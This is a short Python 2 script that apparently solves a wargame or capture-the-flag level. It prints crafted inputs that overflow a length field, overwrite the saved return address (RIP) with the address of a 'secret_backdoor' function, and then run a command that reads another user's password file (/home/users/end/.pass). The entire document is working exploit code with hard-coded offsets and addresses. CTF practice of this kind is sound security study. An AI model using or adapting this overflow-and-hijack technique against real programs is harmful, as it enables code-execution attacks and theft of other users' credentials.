import struct

# set_username fgets    -> sets msg->len to 0xd0
print "A"*0x28 + "\xd0"

# set_msg fgets         -> overwrite RIP with address of secret_backdoor
print "A"*0xc8 + struct.pack("<Q", 0x000055555555488c)

# secret_backdoor fgets -> /bin/sh didn't work for some reason
print "cat /home/users/end/.pass "
